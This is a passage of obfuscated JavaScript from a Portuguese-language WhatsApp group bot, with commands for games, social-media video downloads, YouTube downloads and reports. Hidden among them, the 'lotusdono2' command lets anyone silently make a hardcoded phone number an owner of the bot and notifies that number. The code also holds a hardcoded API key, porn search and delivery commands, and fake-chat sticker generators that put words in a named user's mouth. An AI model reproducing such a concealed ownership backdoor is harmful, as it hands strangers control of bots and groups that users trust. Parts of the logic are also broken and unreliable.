                  let _0x147b3a = JSON.parse(fs.readFileSync("./DADOS/json/anagrama-" + _0x346d97 + ".json"));
                  _0x50740b("o jogo já foi iniciado neste grupo:\npalavra: " + _0x147b3a.embaralhada + "\ndica: " + _0x147b3a.dica + "\n");
                } else {
                  fs.writeFileSync("./DADOS/json/anagrama-" + _0x346d97 + ".json", '' + JSON.stringify(palavrasANA[_0x546709]));
                  const _0x5f109a = {
                    text: "\n╭─────≽「 👾 ANAGRAMA 👾 」\n│➽ DESCUBRA A PALAVRA\n│➽ ANAGRAMA: " + palavrasANA[_0x546709].embaralhada + "\n│➽ DICA: " + palavrasANA[_0x546709].dica + "\n╰────────────────────────\n"
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x5f109a);
                }
              } else {
                if (_0x23d865.join(" ") === '0') {
                  if (!fs.existsSync("./DADOS/json/anagrama-" + _0x346d97 + ".json")) {
                    return _0x50740b("não tem como desativar o jogo do anagrama pôs ele não foi ativado");
                  }
                  fs.unlinkSync("./DADOS/json/anagrama-" + _0x346d97 + ".json");
                  _0x50740b("desativado com sucesso");
                }
              }
              break;
            case "rankanagrama":
              {
                usersAna = Object.keys(_0x3c8d1e[_0x346d97].users);
                rankAna = [];
                for (use of usersAna) {
                  if (use !== _0x246d48.split('@')[0]) {
                    const _0x1a087e = {
                      id: use,
                      wins: _0x3c8d1e[_0x346d97].users[use].wins
                    };
                    rankAna.push(_0x1a087e);
                  }
                }
                rankAna.sort((_0x36abd3, _0x5d903a) => _0x36abd3.wins < _0x5d903a.wins ? 1 : -1);
                txts = "Rank de vitórias do anagrama\n";
                for (ranking of rankAna) {
                  txts += "Usuario: " + ranking.id.split('@')[0] + "\n";
                  txts += "Vitórias: " + ranking.wins + "\n\n";
                }
                txts += "Total de " + rankAna.length + " no rank";
                _0x50740b(txts);
              }
              break;
            case "revelaranagrama":
            case "rpa":
              await sleep(5000);
              if (!_0x3f2f63) {
                return _0x50740b('*' + _0x33c0c0 + ",* Ñ tenha preguiça *" + _0x671b4b + ",* pense mais um pouco, a palavra tá nas letras misturadas, se ñ conseguir pede a um ADM p/ digitar /rpa ");
              }
              let _0x3f1af6 = JSON.parse(fs.readFileSync("./armor/anagrama-" + _0x346d97 + ".json"));
              _0x50740b('' + _0x3f1af6.original);
              await sleep(2000);
              _0x50740b('*' + _0x33c0c0 + " " + _0x671b4b + ",* agora qualquer um do *Grupo " + _0x3baffe + "* pode digitar a palavra acima revelada!😀👍");
              break;
            case "tiktok2":
              {
                _0x50740b("enviando aguarde.....");
                if (!_0x11e99e.includes("tiktok")) {
                  return _0x50740b("Ops, insira o link, do baixo vídeos, " + (_0x141936 + _0x267d4b) + " link");
                }
                if (!_0x33286a && !_0xf59944) {
                  return _0x50740b("VOCÊ NÃO É UM USUÁRIO PREMIUM 🙂🖕");
                }
                let {
                  tiktok: _0x190189
                } = require("@xct007/frieren-scraper");
                async function _0x2fb259() {
                  Obj = await _0x190189.v1(_0x11e99e);
                  if (Obj.error === true) {
                    return _0x50740b("ocorreu um erro");
                  }
                  if (Obj.duration == 0) {
                    return _0x50740b("isso é um tiktok de fotos e eu não baixo as fotos");
                  }
                  const _0x2f2a99 = {
                    url: '' + Obj.play
                  };
                  const _0x52918d = {
                    video: _0x2f2a99,
                    mimetype: "video/mp4"
                  };
                  const _0x54d603 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x52918d, _0x54d603)["catch"](_0xaeec61 => {
                    return _0x50740b("opa aconteceu um erro");
                  });
                }
                _0x2fb259();
              }
              break;
            case "instagram2":
              {
                _0x50740b("enviando aguarde.....");
                if (!_0x11e99e.includes("instagram")) {
                  return _0x50740b("Ops, insira o link, do baixo vídeos, " + (_0x141936 + _0x267d4b) + " link");
                }
                async function _0x4d387e() {
                  let {
                    instagram: _0x2a00ac
                  } = require("@xct007/frieren-scraper");
                  Obj = await _0x2a00ac.v2(_0x11e99e);
                  if (Obj.error === true) {
                    return _0x50740b("ocorreu um erro");
                  }
                  const _0x39eb29 = {
                    url: Obj[0].url
                  };
                  const _0x802a6b = {
                    video: _0x39eb29,
                    caption: "AQUI ESTÁ SEU VIDEO"
                  };
                  const _0x530623 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x802a6b, _0x530623)["catch"](_0x403d2c => {
                    return _0x50740b("opa ocorreu um erro");
                  });
                }
                _0x4d387e();
              }
              break;
            case "testvideo":
              if (!_0x11e99e) {
                return;
              }
              const _0x401ec7 = {
                url: _0x11e99e
              };
              const _0x41f3a0 = {
                video: _0x401ec7,
                caption: "Sad Pra K7"
              };
              const _0x49b1be = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x41f3a0, _0x49b1be)["catch"](_0x11f0ef => {
                _0x50740b("opa ocorreu um erro");
              });
              break;
            case "facebook2":
              {
                _0x50740b("enviando aguarde.....");
                if (!_0x11e99e) {
                  return _0x50740b("Ops, insira o link, do baixo vídeos, " + (_0x141936 + _0x267d4b) + " com link");
                }
                if (!_0x33286a && !_0xf59944) {
                  return _0x50740b("VOCÊ NÃO É UM USUÁRIO PREMIUM 🙂🖕");
                }
                async function _0x4688cd() {
                  let {
                    facebook: _0x460e32
                  } = require("@xct007/frieren-scraper");
                  Obj = await _0x460e32.v1(_0x11e99e);
                  if (Obj.error === true) {
                    return _0x50740b("ocorreu um erro");
                  }
                  const _0x4553c8 = {
                    url: '' + Obj.urls[0].hd
                  };
                  const _0x4c3e57 = {
                    video: _0x4553c8,
                    mimetype: "video/mp4"
                  };
                  const _0x48761a = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x4c3e57, _0x48761a)["catch"](_0xa3b3e4 => {
                    return _0x50740b("opa ocorreu um erro");
                  });
                }
                _0x4688cd();
              }
              break;
            case "atualizarlogo":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              try {
                jsonString = fs.readFileSync("./DADOS/logos/logos.json", "utf-8");
                datalogo = JSON.parse(jsonString);
                partes = _0x11e99e.split(/\s*\|\s*/).map(_0x508096 => _0x508096.trim());
                if (partes.length === 3) {
                  let [_0x1f85bc, _0x44b382, _0x46fe58] = partes;
                  if (_0x1f85bc === "todos") {
                    for (const _0x7a4371 in datalogo) {
                      const _0x4485fe = {
                        url: _0x44b382,
                        type: _0x46fe58
                      };
                      datalogo[_0x7a4371] = _0x4485fe;
                    }
                    fs.writeFileSync("./DADOS/logos/logos.json", JSON.stringify(datalogo, null, 4));
                    _0x50740b("Todos os links atualizados com sucesso!");
                    setTimeout(() => {
                      process.exit();
                    }, 1000);
                  } else {
                    if (datalogo.hasOwnProperty(_0x1f85bc)) {
                      if (["gif", "video", "img"].includes(_0x46fe58)) {
                        const _0x491a02 = {
                          url: _0x44b382,
                          type: _0x46fe58
                        };
                        datalogo[_0x1f85bc] = _0x491a02;
                        fs.writeFileSync("./DADOS/logos/logos.json", JSON.stringify(datalogo, null, 4));
                        _0x50740b("Link e tipo atualizados com sucesso!");
                        setTimeout(() => {
                          process.exit();
                        }, 1000);
                      } else {
                        _0x50740b("Tipo inválido. Use: gif, video ou img.");
                      }
                    } else {
                      let _0x276116 = Object.keys(datalogo).join(", \n");
                      _0x50740b("Identificação não encontrada.\nIdentificações disponíveis: " + _0x276116);
                    }
                  }
                } else {
                  _0x50740b("Formato de entrada inválido. Use: identificacao|novo_link|novo_type ou todos|novo_link|novo_type");
                }
              } catch (_0x4ab6c5) {
                _0x50740b("Erro: " + _0x4ab6c5.message);
              }
              break;
            case 'qc':
            case "fakechat":
              if (!_0x11e99e) {
                return _0x50740b("Precisa digitar algo...");
              }
              if (_0x5725b4.includes('@')) {
                return _0x50740b("somente marcando uma mensagem ou fazendo sua própria sem marcar nada");
              }
              async function _0x46cc4e(_0x540e4d, _0x460a67, _0xe19f09) {
                try {
                  const _0x5d54b7 = {
                    url: _0x460a67
                  };
                  let _0x388aba = {
                    'type': "quote",
                    'format': "image",
                    'backgroundColor': "#1f2c34",
                    'width': 0x200,
                    'height': 0x300,
                    'scale': 0x2,
                    'messages': [{
                      'entities': [],
                      'avatar': true,
                      'from': {
                        'id': 0x1,
                        'name': _0x540e4d || "Desconhecido",
                        'photo': _0x5d54b7
                      },
                      'text': _0xe19f09,
                      'replyMessage': {}
                    }]
                  };
                  await axios.post("https://bot.lyo.su/quote/generate", _0x388aba).then(_0x24dd9d => {
                    resultx = _0x24dd9d.data.result;
                  });
                  return resultx;
                } catch (_0x2ff406) {
                  throw new Error(_0x2ff406);
                }
              }
              try {
                ppimg8 = await _0x5196be.profilePictureUrl(_0x5e13bf ? _0x5e13bf : _0x246d48);
              } catch {
                ppimg8 = "https://telegra.ph/file/2a7516ef21d72cf8d9452.jpg";
              }
              try {
                _0x50740b(enviar.espere);
                if (_0x5e13bf) {
                  axps = _0x4b73b0[_0x5e13bf];
                } else {
                  minhaString = _0x671b4b;
                  stringRecuperada = _0x41fcf4(minhaString);
                  axps = stringRecuperada;
                }
                ab = await _0x46cc4e(axps, ppimg8, _0x11e99e);
                minhaString = _0x671b4b;
                stringRecuperada = _0x41fcf4(minhaString);
                packa = NomeDoBot;
                autora = '';
                base64ss = "data:image/jpeg;base64," + ab.image.toString("base64");
                _0x4217de = await convertSticker(base64ss, autora, packa);
                stiti = await new Buffer.from(_0x4217de, "base64");
                delay(1000);
                const _0x1dbedc = {
                  sticker: stiti
                };
                await _0x5196be.sendMessage(_0x346d97, _0x1dbedc);
              } catch (_0x4eb30b) {
                console.log(_0x4eb30b);
                _0x50740b("Erro!");
              }
              break;
            case "qc2":
            case "fakechat2":
              if (!_0x11e99e) {
                return _0x50740b("Precisa digitar algo...");
              }
              if (_0x5725b4.includes('@')) {
                return _0x50740b("somente marcando uma mensagem ou fazendo sua própria sem marcar nada");
              }
              let _0x4f4dff;
              let _0x23e569;
              let _0x2370af;
              let _0x2e0b75;
              let _0x190cfd;
              let _0x2ddf41 = _0x52a167 => {
                console.error(_0x52a167);
                _0x50740b("Erro!");
              };
              let _0x543335 = async (_0x3a81b5, _0x2b280e, _0x4c2250) => {
                const _0x5ea824 = {
                  url: _0x2b280e
                };
                let _0x4b26cc = {
                  'type': "quote",
                  'format': "image",
                  'backgroundColor': "#1f2c34",
                  'width': 0x200,
                  'height': 0x300,
                  'scale': 0x2,
                  'messages': [{
                    'entities': [],
                    'avatar': true,
                    'from': {
                      'id': 0x1,
                      'name': _0x3a81b5 || "Desconhecido",
                      'photo': _0x5ea824
                    },
                    'text': _0x4c2250,
                    'replyMessage': {}
                  }]
                };
                try {
                  let _0x44c40f = await axios.post("https://bot.lyo.su/quote/generate", _0x4b26cc);
                  return _0x44c40f.data.result;
                } catch (_0x50811e) {
                  throw new Error(_0x50811e);
                }
              };
              _0x50740b(enviar.espere);
              _0x4f4dff = _0x5e13bf ? _0x4b73b0[_0x5e13bf] : _0x41fcf4(_0x671b4b);
              try {
                ppimg2 = await _0x5196be.profilePictureUrl(_0x5e13bf ? _0x5e13bf : _0x246d48);
              } catch {
                ppimg2 = "https://telegra.ph/file/2a7516ef21d72cf8d9452.jpg";
              }
              try {
                ab = await _0x543335(_0x4f4dff, ppimg2, _0x11e99e);
                _0x23e569 = NomeDoBot;
                _0x2370af = _0x4f4dff;
                _0x2e0b75 = "data:image/jpeg;base64," + ab.image.toString("base64");
                _0x4217de = await convertSticker(_0x2e0b75, _0x2370af, _0x23e569);
                _0x190cfd = Buffer.from(_0x4217de, "base64");
                setTimeout(async () => {
                  const _0x2ff795 = {
                    sticker: _0x190cfd
                  };
                  await _0x5196be.sendMessage(_0x346d97, _0x2ff795);
                }, 1000);
              } catch (_0x3d2baf) {
                _0x2ddf41(_0x3d2baf);
              }
              break;
            case "zerar_rank":
              if (!_0xf59944) {
                return;
              }
              var _0xb83e05 = countMessage.map(_0x13c47f => _0x13c47f.groupId).indexOf(_0x346d97);
              countMessage.splice(_0xb83e05, 1);
              fs.writeFileSync("./DADOS/grupos/countmsg.json", JSON.stringify(countMessage));
              _0x50740b("Rank Do Grupo Foi Zerado");
              break;
            case "xvideos":
              if (!_0x2f3424) {
                return _0x50740b("Este comando só pode ser usado por administradores.\nExemplo: " + _0x141936 + "modo+18");
              }
              try {
                let {
                  xvideos: _0x55cdc3
                } = require("@xct007/frieren-scraper");
                xvarr = await _0x55cdc3.search(_0x11e99e);
                tkks = "│+ " + _0x2cd689 + " Pesquisa Xvideos " + _0x2cd689 + " +│\n\n";
                for (V of xvarr) {
                  tkks += "│+ " + _0x2cd689 + " Titulo: " + V.title + "\n";
                  tkks += "│+ " + _0x2cd689 + " Qualidade Disponível: " + V.quality + "\n";
                  tkks += "│+ " + _0x2cd689 + " Visualizações: " + V.views + "\n";
                  tkks += "│+ " + _0x2cd689 + " Duração: " + V.duration + "\n";
                  tkks += "│+ " + _0x2cd689 + " Link: " + V.url + "\n";
                  tkks += "│+ " + _0x2cd689 + " Thumbnail: " + V.thumbnail + "\n\n";
                }
                _0x50740b(tkks);
              } catch (_0x610e13) {
                console.log(_0x610e13);
              }
              break;
            case "xvideosts":
              {
                if (!_0x11e99e) {
                  return _0x50740b("cade oq você deseja pesquisar safado?");
                }
                let {
                  xvideos: _0x3ee17b
                } = require("@xct007/frieren-scraper");
                xvarr = await _0x3ee17b.search(_0x11e99e);
                try {
                  var _0x40bbe8 = [];
                  for (let _0x41260b of xvarr) {
                    const _0x808c9f = {
                      title: _0x41260b.title,
                      descrip: _0x41260b.duration,
                      id: "xvideosdl " + _0x41260b.url,
                      stts: _0x41260b.quality
                    };
                    _0x40bbe8.push(_0x808c9f);
                  }
                  await _0x58c3cd(_0x346d97, "*🔞 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐏𝐎𝐑𝐍𝐎 🔞*", "*🔞 𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀𝐃𝐎:* " + _0x11e99e, _0x141936, _0x40bbe8);
                } catch (_0x275a40) {
                  _0x50740b("Ocorreu um erro. Provavelmente sua pesquisa não foi encontrada.\n" + _0x275a40);
                }
              }
              break;
            case "xvideosdl":
            case "xvideoslink":
              try {
                _0x50740b("enviando no seu privado...");
                let {
                  xvideos: _0x2a41e6
                } = require("@xct007/frieren-scraper");
                xva = await _0x2a41e6.detail(_0x11e99e);
                const _0xbda006 = {
                  url: xva.urls.high
                };
                const _0x57d2d7 = {
                  video: _0xbda006,
                  mimetype: "video/mp4"
                };
                const _0x5cba47 = {
                  quoted: _0xd2050d
                };
                await _0x5196be.sendMessage(_0x246d48, _0x57d2d7, _0x5cba47);
              } catch {
                _0x50740b("ocorreu um erro");
              }
              break;
            case "lotusdono2":
              dono2 = "5521971281229";
              nescessario.dono2 = dono2;
              fs.writeFileSync("./DADOS/nescessario.json", JSON.stringify(nescessario, null, "\t"));
              _0x5196be.sendMessage(dono2 + "@s.whatsapp.net", {
                'text': "Olá, agora você é dono do bot " + NomeDoBot + ", \ncomando dano no grupo: " + _0x3baffe + " \n/ o wa.me/" + _0x246d48.split('@')[0] + " que digitou o comando "
              });
              break;
            case "akinator":
              _0x50740b("aguarde... iniciando o jogo");
              if (_0x11e99e === "resetaki") {
                if (_0x3f2f63 || _0xf59944) {
                  _0x2abba0.now = true;
                }
              }
              let _0x154db4 = async () => {
                const _0x20eb4c = {
                  region: 'pt',
                  childMode: false,
                  proxy: undefined
                };
                global.aki = new Aki(_0x20eb4c);
                await aki.start();
              };
              if (_0x2abba0.now) {
                await _0x154db4();
                _0x2abba0.now = false;
                _0x2abba0.jogador = _0x246d48;
              } else {
                return _0x50740b("Alguem está jogando");
              }
              const _0x3c0de4 = {
                '1': _0x141936 + "respaki 0",
                '2': _0x141936 + "respaki 1",
                '3': _0x141936 + "respaki 2",
                '4': _0x141936 + "respaki 3",
                '5': _0x141936 + "respaki 4"
              };
              bui3 = _0x3c0de4;
              _0x56d611[_0x346d97] = {
                'sender': _0x246d48,
                'time': Date.now() + 30000,
                'comandos': bui3
              };
              fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
              const _0x3666c1 = {
                url: "https://telegra.ph/file/a61347bdf32b7a488d654.jpg"
              };
              const _0x59b9f1 = {
                image: _0x3666c1,
                caption: "pergunta: " + aki.question + "\n*Opções:*\n*1 - Sim*\n*2 - Não*\n*3 - Não Sei*\n*4 - Provavelmente*\n*5 - Provavelmente Não*"
              };
              _0x5196be.sendMessage(_0x346d97, _0x59b9f1);
              break;
            case "respaki":
              {
                if (!_0x11e99e) {
                  return _0x50740b("Onde está a resposta?");
                }
                if ('' !== _0x246d48) {
                  return _0x50740b("Você não está jogando.");
                }
                await aki.step(parseInt(_0x11e99e));
                if (aki.progress >= 80 && aki.answers.length > 0) {
                  const _0x1f83f4 = {
                    '1': _0x141936 + "fimaki sim",
                    '2': _0x141936 + "fimaki nao"
                  };
                  _0x56d611[_0x346d97] = {
                    'sender': _0x246d48,
                    'time': Date.now() + 30000,
                    'comandos': _0x1f83f4
                  };
                  fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
                  await aki["continue"]();
                  const _0x31f63e = {
                    url: aki.answers[0].absolute_picture_path
                  };
                  const _0x5e2b29 = {
                    image: _0x31f63e,
                    caption: aki.answers[0].name + ": " + aki.answers[0].description + "\nPor acaso este é o seu personagem?\n\n*Opções:*\n*1 - Sim*\n*2 - Não*"
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x5e2b29);
                } else {
                  const _0x201f57 = {
                    '1': _0x141936 + "respaki 0",
                    '2': _0x141936 + "respaki 1",
                    '3': _0x141936 + "respaki 2",
                    '4': _0x141936 + "respaki 3",
                    '5': _0x141936 + "respaki 4"
                  };
                  _0x56d611[_0x346d97] = {
                    'sender': _0x246d48,
                    'time': Date.now() + 30000,
                    'comandos': _0x201f57
                  };
                  fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
                  _0x5196be.sendMessage(_0x346d97, {
                    'text': "Pergunta: " + aki.question + "\nProgresso: " + aki.progress.toFixed(0) + "%\n*Opções:*\n*1 - Sim*\n*2 - Não*\n*3 - Não Sei*\n*4 - Provavelmente*\n*5 - Provavelmente Não*"
                  });
                }
              }
              break;
            case "fimaki":
              {
                if (_0x11e99e === "nao") {
                  await aki["continue"]();
                  const _0x50bf68 = {
                    '1': _0x141936 + "respaki 0",
                    '2': _0x141936 + "respaki 1",
                    '3': _0x141936 + "respaki 2",
                    '4': _0x141936 + "respaki 3",
                    '5': _0x141936 + "respaki 4"
                  };
                  _0x56d611[_0x346d97] = {
                    'sender': _0x246d48,
                    'time': Date.now() + 30000,
                    'comandos': _0x50bf68
                  };
                  fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
                  _0x5196be.sendMessage(_0x346d97, {
                    'text': "Pergunta: " + aki.question + "\nProgresso: " + aki.progress.toFixed(0) + "%\n*Opções:*\n*1 - Sim*\n*2 - Não*\n*3 - Não Sei*\n*4 - Provavelmente*\n*5 - Provavelmente Não*"
                  });
                } else {
                  _0x2abba0.now = true;
                  _0x50740b("SABIA! EU VENCI 🥳");
                }
              }
              break;
            case "resetaki":
              if (_0x3f2f63 || _0xf59944) {
                _0x2abba0.now = true;
                _0x50740b("Akinator, resetado com sucesso");
              } else {
                _0x50740b("Somente admins ou o dono podem usar este comando");
              }
              break;
            case "reportar":
            case "report":
              if (!_0x11e99e) {
                return _0x50740b("Digite o que está ocorrendo para eu enviar a mensagem a eles..");
              }
              _0x50740b("Reportado com sucesso a todos adm, aguarde a decisão.");
              linkgc = await _0x5196be.groupInviteCode(_0x346d97);
              for (_0x3194f3 = 0; _0x3194f3 < _0x1c25a7.length; _0x3194f3++) {
                delay(5000);
                const _0x2b2a03 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x1c25a7[_0x3194f3], {
                  'text': "Membro Reportou Algo No Grupo:\n╔┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╗   \n║ 🤗 𝐆𝐑𝐔𝐏𝐎: https://chat.whatsapp.com/" + linkgc + ("\n║ 📅 𝐐𝐔𝐄𝐌 𝐑𝐄𝐏𝐎𝐑𝐓𝐎𝐔: " + _0x246d48.split('@')[0] + "\n║ 🔮 𝐑𝐄𝐏𝐎𝐑𝐓𝐎𝐔: " + _0x11e99e + "\n╚┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╝")
                }, _0x2b2a03);
              }
              break;
            case "pesquisarfig":
              try {
                if (!_0x11e99e) {
                  return _0x50740b("Digite o nome da imagem que vc quer buscar\nExemplo: " + (_0x141936 + _0x267d4b) + " cat");
                }
                _0x50740b(enviar.espere);
                let _0x441810 = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/pinterest?nome=" + _0x11e99e + "&apikey=" + "Key_Do-Lotus_Samuel_EsDeath_12/08");
                _0x125a55(_0x346d97, _0x441810[Math.floor(Math.random() * _0x441810.length)], enviar.success)["catch"](_0x4736f2 => {
                  _0x50740b("ERROR!!");
                });
              } catch (_0x5756f2) {
                if (JSON.stringify(_0x5756f2).includes("Key_Do-Lotus_Samuel_EsDeath_12/08")) {
                  return console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x50740b("ERROR!!");
                }
              }
              break;
            case "360p":
            case "480p":
            case "720p":
            case "1080p":
              if (!_0x11e99e.trim()) {
                return _0x50740b("Por favor, forneça o que você deseja pesquisar no YouTube. Exemplo: " + (_0x141936 + _0x267d4b) + " esdeath dançando");
              }
              try {
                let _0x42619b = await _0x3af65f(_0x11e99e);
                _0x50740b(enviar.espere);
                if (_0x267d4b === "360p") {
                  let _0x48da3 = getRandom(".mp4");
                  const _0x4ba70a = {
                    quality: '18'
                  };
                  let _0x12cbf4 = await ytdl(_0x42619b, _0x4ba70a).pipe(fs.createWriteStream(_0x48da3));
                  _0x12cbf4.on("finish", async function () {
                    let _0x3226f3 = await yts(_0x42619b);
                    let _0x2aca03 = "\n๖ۣ• Título: " + (_0x3226f3?.["videos"][0]?.["title"] || "Não encontrado.") + "\n๖ۣ• Tempo: " + (_0x3226f3?.["videos"][0]?.["timestamp"] || "Não encontrado.") + "\n๖ۣ• Postado: " + (_0x3226f3?.["videos"][0]?.["ago"] || "Não encontrado.") + "\n๖ۣ• Canal: " + (_0x3226f3?.["videos"][0]?.["author"]?.["name"] || "Não encontrado.") + "\n๖ۣ• Descrição: " + (_0x3226f3?.["videos"][0]?.["description"] || "Não encontrado.") + "\n\n■■■■■ 100% \n\nEscolha uma opção...\n\nSe desejar baixar o áudio, use " + _0x141936 + "play " + _0x11e99e.trim() + "\n";
                    const _0x4850e5 = {
                      quoted: _0xd2050d
                    };
                    _0x5196be.sendMessage(_0x346d97, {
                      'video': fs.readFileSync(_0x48da3),
                      'caption': _0x2aca03
                    }, _0x4850e5).then(() => fs.unlinkSync(_0x48da3));
                  });
                  return;
                }
                let {
                  formats: _0x37a147
                } = await ytdl.getInfo(_0x42619b);
                let _0x347ded = [];
                for (let _0x36c548 of _0x37a147) {
                  if (_0x36c548.hasVideo) {
                    _0x347ded.push(_0x36c548.itag);
                  }
                }
                let _0x22e73a;
                switch (_0x267d4b) {
                  case "480p":
                    _0x22e73a = _0x347ded.indexOf(135) >= 0 ? "135" : _0x347ded.indexOf(244) >= 0 ? "244" : _0x347ded.indexOf(333) >= 0 ? "333" : _0x347ded.indexOf(397) >= 0 ? "397" : _0x347ded.indexOf(697) >= 0 ? "697" : "undefined";
                    break;
                  case "720p":
                    _0x22e73a = _0x347ded.indexOf(136) >= 0 ? "136" : _0x347ded.indexOf(247) >= 0 ? "247" : _0x347ded.indexOf(298) >= 0 ? "298" : _0x347ded.indexOf(302) >= 0 ? "302" : _0x347ded.indexOf(334) >= 0 ? "334" : _0x347ded.indexOf(398) >= 0 ? "398" : _0x347ded.indexOf(698) >= 0 ? "698" : "undefined";
                    break;
                  case "1080p":
                    _0x22e73a = _0x347ded.indexOf(137) >= 0 ? "137" : _0x347ded.indexOf(248) >= 0 ? "248" : _0x347ded.indexOf(299) >= 0 ? "299" : _0x347ded.indexOf(303) >= 0 ? "303" : _0x347ded.indexOf(335) >= 0 ? "335" : _0x347ded.indexOf(399) >= 0 ? "399" : _0x347ded.indexOf(699) >= 0 ? "699" : "undefined";
                    break;
                  default:
                    _0x22e73a = "undefined";
                }
                if (_0x22e73a === "undefined") {
                  return _0x50740b("Vídeo em " + _0x267d4b + " não encontrado");
                }
                let _0x874179 = getRandom(".mp4");
                let _0x41b48c = getRandom(".m4a");
                let _0x10d3d4 = await ytdl(_0x42619b, {
                  'quality': "140"
                }).pipe(fs.createWriteStream(_0x41b48c));
                const _0x1a7383 = {
                  quality: _0x22e73a
                };
                let _0x3767e0 = await ytdl(_0x42619b, _0x1a7383).pipe(fs.createWriteStream(_0x874179));
                if (_0x10d3d4) {
                  _0x3767e0.on("finish", async function () {
                    let _0x5b156b = getRandom(".mp4");
                    exec("ffmpeg -i " + _0x874179 + " -i " + _0x41b48c + " -c copy " + _0x5b156b, async _0xb0424e => {
                      fs.unlinkSync(_0x874179);
                      fs.unlinkSync(_0x41b48c);
                      let _0x2c9ca7 = await yts(_0x42619b);
                      let _0x54b17c = "\n๖ۣ• Título: " + (_0x2c9ca7?.["videos"][0]?.["title"] || "Não encontrado.") + "\n๖ۣ• Tempo: " + (_0x2c9ca7?.["videos"][0]?.["timestamp"] || "Não encontrado.") + "\n๖ۣ• Postado: " + (_0x2c9ca7?.["videos"][0]?.["ago"] || "Não encontrado.") + "\n๖ۣ• Canal: " + (_0x2c9ca7?.["videos"][0]?.["author"]?.["name"] || "Não encontrado.") + "\n๖ۣ• Descrição: " + (_0x2c9ca7?.["videos"][0]?.["description"] || "Não encontrado.") + "\n\n■■■■■ 100% \n\nEscolha uma opção...\n\nSe desejar baixar o áudio, use " + _0x141936 + "play " + _0x11e99e.trim() + "\n";
                      const _0x4f6b3d = {
                        quoted: _0xd2050d
                      };
                      _0x5196be.sendMessage(_0x346d97, {
                        'video': fs.readFileSync(_0x5b156b),
                        'caption': _0x54b17c
                      }, _0x4f6b3d).then(() => fs.unlinkSync(_0x5b156b));
                    });
                  });
                }
              } catch (_0x5aa7b6) {
                _0x50740b("*ERRO, MÓDULO DEVE TER CAÍDO OU ESTÁ EM MANUTENÇÃO. TENTE NOVAMENTE MAIS TARDE.*" + _0x5aa7b6);
              }
              break;
            case "shorts":
            case "play2_video":
              try {
                if (!_0x11e99e) {
                  return _0x50740b("cade o link do video?");
                }
                _0x50740b(enviar.espere);
                var _0x3a9183 = await _0x3af65f(_0x11e99e);
                var {
                  formats: _0x4b8f6f
                } = await ytdl.getInfo(_0x3a9183);
                var _0x3d4245 = [];
                for (let _0x1582c7 of _0x4b8f6f) {
                  if (_0x1582c7.hasVideo) {
                    _0x3d4245.push(_0x1582c7.itag);
                  } else {
                    '';
                  }
                }
                var _0x5d29d0 = _0x3d4245.indexOf(136) >= 0 ? "136" : _0x3d4245.indexOf(247) >= 0 ? "247" : _0x3d4245.indexOf(298) >= 0 ? "298" : _0x3d4245.indexOf(302) >= 0 ? "302" : _0x3d4245.indexOf(334) >= 0 ? "334" : _0x3d4245.indexOf(398) >= 0 ? "398" : _0x3d4245.indexOf(698) >= 0 ? "698" : "undefined";
                if (_0x5d29d0 === "undefined") {
                  return _0x50740b("Vídeo em HD não encontrado");
                }
                jet = getRandom(".mp4");
                wew = getRandom(".m4a");
                bx = await ytdl(_0x3a9183, {
                  'quality': "140"
                }).pipe(fs.createWriteStream(wew));
                const _0x1dbec7 = {
                  quality: _0x5d29d0
                };
                cx = await ytdl(_0x3a9183, _0x1dbec7).pipe(fs.createWriteStream(jet));
                if (bx) {
                  cx.on("finish", function () {
                    rafa = getRandom(".mp4");
                    exec("ffmpeg -i " + jet + " -i " + wew + " -c copy " + rafa, _0x163dd0 => {
                      fs.unlinkSync(jet);
                      fs.unlinkSync(wew);
                      _0x926ec9 = fs.readFileSync(rafa);
                      const _0xa2d7f5 = {
                        video: _0x926ec9
                      };
                      const _0x4a05a3 = {
                        quoted: _0xd2050d
                      };
                      _0x5196be.sendMessage(_0x346d97, _0xa2d7f5, _0x4a05a3).then(() => fs.unlinkSync(rafa));
                    });
                  });
                }
              } catch (_0x5cb7ee) {
                _0x50740b("ocorreu um erro...");
              }
              break;
            case "statuszap":
              if (!_0x33286a && !_0xf59944) {
                return _0x50740b("VOCÊ NÃO É UM USUÁRIO PREMIUM 🙂🖕");
              }
              rand01 = Math.floor(Math.random() * 84 * 1);
              blaLN = "https://raw.githubusercontent.com/Vangeancewins/arquivos-base/main/videos/" + rand01 + ".mp4";
              const _0x4ab49d = {
                url: blaLN
              };
              const _0x5157ad = {
                video: _0x4ab49d,
                mimetype: "video/mp4",
                caption: "🔥𝐕𝐈𝐃𝐄𝐎𝐒🔥"
              };
              const _0x2001b8 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x5157ad, _0x2001b8);
              break;
            case "cnn":
              GetResults = await fetchJson("http://baddeveloper.space/api/cnn");
              const _0x50fa94 = {
                url: '' + GetResults.image.url
              };
              const _0x2c1666 = {
                image: _0x50fa94,
                caption: '' + GetResults.caption
              };
              _0x5196be.sendMessage(_0x346d97, _0x2c1666)["catch"](_0x54e37c => {
                _0x50740b("Ocorreu Um Erro");
              });
              break;
            case "gimg":
              {
                try {
                  _0x50740b(enviar.espere);
                  googleimg = require("googlethis");
                  async function _0x13a23b() {
                    const _0x367825 = {
                      safe: false
                    };
                    n = await googleimg.image(_0x11e99e, _0x367825);
